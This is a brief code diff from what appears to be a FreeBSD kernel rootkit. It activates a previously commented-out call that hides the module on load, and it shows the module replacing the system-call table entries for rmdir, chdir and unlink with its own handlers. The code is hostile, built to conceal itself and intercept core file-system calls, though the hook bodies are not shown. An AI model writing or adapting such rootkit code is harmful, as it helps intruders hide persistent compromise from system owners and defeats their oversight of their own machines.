@@ -23,7 +23,7 @@ static int load(struct module *module, int cmd, void *args) {
 
 	switch(cmd) {
 	case MOD_LOAD:
-		//bds_hide_module();
+		bds_hide_module();
 		sysent[SYS_rmdir].sy_call = (sy_call_t *) bds_rmdir;
 		sysent[SYS_chdir].sy_call = (sy_call_t *) bds_chdir;
 		sysent[SYS_unlink].sy_call = (sy_call_t *) bds_unlink;
